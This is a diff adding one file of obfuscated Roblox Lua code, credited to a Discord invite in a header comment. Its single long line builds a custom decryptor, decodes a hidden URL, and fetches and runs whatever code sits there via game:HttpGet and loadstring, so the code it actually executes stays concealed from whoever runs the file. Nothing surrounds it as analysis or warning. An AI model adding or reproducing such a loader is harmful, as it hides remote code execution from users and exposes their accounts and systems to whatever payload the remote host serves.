@@ -1,0 +1,6 @@
+--[[
+
+obfuscated @ discord.gg/25ms
+
+--]]
+local T,o do local A,f,L,M,a,l,d,x,s,N=math.floor,math.random,table.remove,string.char,0,2,{},{},0,{}for T=1,256,1 do(N)[T]=T end repeat local T=f(1,#N)local o=L(N,T);(x)[o]=M(o-1)until#N==0 local Q={}local function E()if#Q==0 then a=(a*33+1567099978569)%35184372088832 repeat l=(l*91)%257 until l~=1 local T=l%32 local o=(A(a/2^(13-(l-T)/32))%4294967296.0)/2^T local f=A((o%1)*4294967296.0)+A(o)local L=f%65536 local M=(f-L)/65536 local d=L%256 local x=(L-d)/256 local s=M%256 local N=(M-s)/256 Q={d,x;s;N}end return table.remove(Q)end local W={}o=setmetatable({},{__index=W,__metatable=false})function T(o,A)local f=W if(f)[A]then else Q={}local T=x a=A%35184372088832 l=A%255+2 local L=string.len(o);(f)[A]=``local M=185 for L=1,L,1 do M=((string.byte(o,L)+E())+M)%256;(f)[A]=(f)[A]..(T)[M+1]end end return A end end;(loadstring(game:HttpGet((o)[T(`\173\212\181\247|\170\142\0036\1422-\229\b|xd\019\031\201\203S-\188V\243\0143\240\249\171l6\156s\237\135\254R\211\169\2226\179&\025w\b\171\157\158\134*\172\185\255\213\242)R\022\128\016\235rC\096hl\031|e\020`,3684765790387)])))()
